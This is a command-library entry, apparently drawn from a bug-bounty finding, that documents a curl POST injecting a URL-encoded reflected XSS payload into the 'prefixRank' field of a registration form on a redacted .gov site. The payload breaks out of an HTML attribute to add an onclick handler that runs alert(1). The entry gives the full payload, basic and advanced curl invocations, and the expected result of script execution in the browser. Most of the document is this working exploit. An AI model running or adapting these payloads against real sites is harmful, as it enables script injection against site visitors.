---
data: >-
  curl -X POST https://www.████.gov/ioss/site/customer.cfm -d
  "email=user@example.com" -d
  "prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15" -d
  "firstName=Test" -d "lastName=User" --data-urlencode "other fields as
  required"
tags:
  - xss
  - payload-injection
  - curl
  - post-request
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.906Z'
id: a771854a-a21d-4c91-b33b-8c54d28e16dd
verified: false
validated: true
submitted: true
---
# inject-xss-payload-curl

## Command

```bash
curl -X POST https://www.████.gov/ioss/site/customer.cfm \
  -d "email=user@example.com" \
  -d "prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15" \
  -d "firstName=Test" \
  -d "lastName=User" \
  --data-urlencode "other fields as required"
```

## Description

This command injects a URL-encoded XSS payload into the prefixRank parameter during a duplicate registration POST, exploiting reflection to execute JavaScript like alert(1) in the browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-d prefixRank` | The encoded payload for injection | Yes |
| `-d email` | Duplicate email to trigger error | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.████.gov/ioss/site/customer.cfm -d "prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15"
```

### Advanced Usage

```bash
curl -X POST https://www.████.gov/ioss/site/customer.cfm -d "prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15" -v --cookie-jar cookies.txt
```

## Expected Output

HTTP 200 with error page HTML containing the injected payload, resulting in JavaScript execution (e.g., alert dialog) when viewed in a browser.

## Related

- [[commands/submit-initial-registration-curl]]
- [[commands/submit-duplicate-registration-curl]]
